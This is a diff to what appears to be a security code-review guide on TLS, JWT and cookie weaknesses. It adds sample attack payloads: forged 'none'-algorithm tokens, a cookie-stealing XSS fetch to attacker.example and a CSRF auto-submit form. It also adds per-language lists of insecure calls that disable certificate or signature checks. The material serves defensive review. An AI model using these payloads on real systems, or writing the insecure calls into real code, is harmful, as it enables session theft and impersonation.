@@ -37,6 +37,123 @@ The unsafe assumption is that the network is honest, the token payload is author
 
 **Suggested additions for the same review pass:** debug endpoints left enabled in production, permissive CORS with credentials, missing CSRF on state-changing cookie auth ([4.13](4-13-review-csrf.md)), trust-all proxy headers without validation, and disabling security headers (CSP, HSTS) at the edge.
 
+## Attack Payloads
+
+Use these in authorized tests against TLS clients, JWT validators, and cookie-based sessions.
+
+### Pattern 1: Forged JWT (no signature verification)
+
+```json
+{"alg":"none"}
+{"sub":"admin","role":"superuser","exp":9999999999}
+```
+
+```text
+# Base64url header.payload.  (trailing dot, empty signature)
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+```
+
+### Pattern 2: HS256 with weak / public secret
+
+```text
+# Attacker brute-forces "changeme" or reads secret from git
+# Re-signs token with elevated claims
+{"sub":"victim","role":"admin"}
+```
+
+### Pattern 3: Algorithm confusion (RS256 → HS256)
+
+```text
+# Use RS256 public key as HMAC secret when server accepts both
+{"alg":"HS256","typ":"JWT"}
+```
+
+See [4.16 Review JWT Security](4-16-review-jwt-security.md) for full algorithm-confusion patterns.
+
+### Pattern 4: MITM with verification disabled
+
+```text
+# Attacker on network path presents self-signed cert
+# Client with verify=False accepts and reads/modifies OAuth tokens, API keys
+```
+
+### Pattern 5: Session cookie theft via missing flags
+
+```javascript
+// XSS payload when HttpOnly is false:
+document.cookie
+fetch('https://attacker.example/?c=' + document.cookie)
+```
+
+### Pattern 6: Cross-site cookie send (missing SameSite)
+
+```html
+<!-- Victim visits attacker page; browser sends session cookie on cross-site POST -->
+<form action="https://app.example/transfer" method="POST">
+  <input name="amount" value="10000">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+### Python
+
+```python
+requests.get(url, verify=False)
+requests.get(user_url, verify=False)  # SSRF + MITM
+httpx.Client(verify=False)
+ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+jwt.decode(token, options={"verify_signature": False})
+jwt.decode(token, "changeme", algorithms=["HS256", "none"])
+resp.set_cookie("session", sid, httponly=False, secure=False)
+urllib3.disable_warnings()  # often paired with verify=False
+```
+
+Also review: `aiohttp` connector with `ssl=False`, `paramiko` AutoAddPolicy, `smtp` without TLS.
+
+### Java
+
+```java
+conn.setSSLSocketFactory(trustAllFactory);
+conn.setHostnameVerifier((h, s) -> true);
+HttpClients.custom().setSSLContext(trustAll).build();
+Jwts.parser().setSigningKey("secret").parseClaimsJws(jwt);  // no iss/aud
+new JwtParserBuilder().setAllowedClockSkewSeconds(Integer.MAX_VALUE);
+Cookie c = new Cookie("JSESSIONID", id);  // no HttpOnly/Secure
+```
+
+Spring: `spring.security.oauth2.resourceserver.jwt` misconfiguration; custom filters that only base64-decode JWT payload.
+
+### C#
+
+```csharp
+handler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
+ServicePointManager.ServerCertificateValidationCallback += (_, _, _, _) => true;
+new JwtSecurityTokenHandler().ReadJwtToken(jwt);  // no validation
+TokenValidationParameters { ValidateIssuer = false, ValidateAudience = false };
+Response.Cookies.Append("Session", id, new CookieOptions { HttpOnly = false });
+```
+
+### JavaScript
+
+```javascript
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+axios.get(url, { httpsAgent: new https.Agent({ rejectUnauthorized: false }) });
+jwt.decode(token);  // jsonwebtoken — no verify
+res.cookie('session', sid);  // express — default flags
+fetch(url, { agent: new https.Agent({ rejectUnauthorized: false }) });
+```
+
+### Go
+
+```go
+tls.Config{InsecureSkipVerify: true}
+jwt.ParseUnverified(tokenString, jwt.MapClaims{})
+http.SetCookie(w, &http.Cookie{Name: "session", Value: sid})  // no HttpOnly
+grpc.WithTransportCredentials(insecure.NewCredentials())
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
